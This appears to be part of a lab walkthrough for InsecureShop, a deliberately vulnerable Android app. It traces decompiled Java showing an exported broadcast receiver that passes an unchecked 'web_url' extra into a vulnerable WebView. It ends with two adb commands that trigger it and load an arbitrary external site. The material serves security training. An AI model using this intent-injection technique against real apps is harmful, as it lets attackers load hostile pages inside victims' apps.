In `com.insecureshop.AboutUsActivity`, we can see the following code.

```java
CustomReceiver customReceiver = new CustomReceiver();
        this.receiver = customReceiver;
        if (customReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("receiver");
        }
        registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));
```
A receiver is being registered for the Intent com.insecureshop.CUSTOM_INTENT. The type of the receiver is CustomReceiver

In the CustomReceiver class, we can find the following code.
```
String stringExtra = (intent == null || (extras = intent.getExtras()) == null) ? null : extras.getString("web_url");
        String str = stringExtra;
        if (!(str == null || StringsKt.isBlank(str))) {
            Intent intent2 = new Intent(context, (Class<?>) WebView2Activity.class);
            intent2.putExtra("url", stringExtra);
            if (context != null) {
                context.startActivity(intent2);
            }
```
The web_url passed as extras to the intent is being used to start the WebView2Activity which as we saw earlier is vulnerable.

So all we have to do to take advantage of this, is start the AboutUsActivity and then broadcast a properly formatted intent. This can be done by issuing the following two commands utilizing adb:

`adb shell am start -n com.insecureshop/.AboutUsActivity`
`adb shell am broadcast -a com.insecureshop.CUSTOM_INTENT --es web_url "https://yasuu.free.nf"`

